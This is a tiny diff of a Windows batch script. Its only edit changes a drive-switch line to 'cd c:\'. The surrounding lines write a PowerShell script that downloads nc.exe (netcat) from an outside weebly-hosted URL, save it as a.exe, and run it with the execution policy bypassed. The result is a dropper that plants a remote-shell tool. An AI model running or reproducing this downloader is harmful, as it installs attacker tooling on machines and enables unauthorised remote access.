@@ -1,4 +1,4 @@
-c:
+cd c:\
 mkdir win  
 cd c:/win
 echo $client = new-object System.Net.WebClient ; $client.DownloadFile("http://hakme.weebly.com/uploads/2/3/8/7/23870083/nc.exe","C:\win\a.exe") > c:\win\b.ps1 & powershell -ExecutionPolicy ByPass -File c:\win\b.ps1 
